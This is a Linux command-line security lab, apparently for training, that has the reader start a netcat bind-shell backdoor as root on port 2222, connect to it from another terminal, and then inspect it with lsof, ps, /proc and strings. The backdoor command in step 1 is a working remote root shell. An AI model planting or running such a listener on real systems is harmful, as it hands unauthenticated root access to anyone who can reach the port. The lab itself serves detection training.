# Linux CLI 

In this lab we’ll examine a simple backdoor using the Linux command line.
You’ll use common CLI tools to investigate what the backdoor is doing and how it behaves. We’ll run three Kali terminals:

Terminal 1 — host and run the backdoor.

Terminal 2 — connect to the backdoor (attacker/client).

Terminal 3 — perform analysis and investigation.

1 — Start Terminal 1 (host the backdoor)


Open a Kali terminal as Administrator (or click the Kali logo in the taskbar). Then become root:

```bash

sudo su -
```


We want the backdoor running as root, while the connection is made from a different user account. Create a FIFO backpipe:

```bash

mknod backpipe p
```

Start the backdoor (Netcat listener piping to a bash shell):

```bash

/bin/bash backpipe 0<backpipe | nc -l 2222 1>backpipe
```

Explanation: this creates a Netcat listener on port 2222 that sends input from the FIFO into /bin/bash, then writes the shell output back into the FIFO — effectively a remote shell backdoor on port 2222.


2 — Terminal 2 (connect to the backdoor)

Open another Kali terminal (right-click the icon → Open). Find the host IP:

```bash

ifconfig
```


Connect to the backdoor (replace the IP with your host’s IP):

nc 10.10.104.64 2222


Note: YOUR IP WILL BE DIFFERENT.

To confirm the connection, run a few commands from Terminal 2:

ls
whoami


If you see output, you’re connected to the remote shell.

3 — Terminal 3 (analysis)

Open a third Kali terminal and become root again:

sudo su -


Root access is required because we’ll inspect system-wide network connections and process details.

Inspect open network connections with lsof

Show open Internet connections and port numbers:

lsof -i -P


Find the Netcat process and its PID from that output, then list files opened by that PID:

lsof -p [PID]

View running processes with ps

List full process details:

ps aux


Locate the Netcat (or bash) PID you want to inspect, then change into its /proc directory (replace [pid]):

cd /proc/[pid]


Note: /proc is a virtual filesystem that exposes runtime process information. Your PID will be different.

List contents:

ls

Inspect in-memory binary strings

You can extract readable strings from the executable mapped for the process:

strings ./exe | less


Scrolling through this output often reveals usage text, referenced libraries, and other useful clues (we’re reading the program’s memory image).

Press Enter to reveal more lines in less.

Quick reminders

Replace IPs and PIDs with values from your environment.

Use Ctrl+C to stop listeners or sessions when finished.

Running these steps as root is intentional for the lab (inspect system-wide state), but always exercise caution when running shells or listeners on production systems.
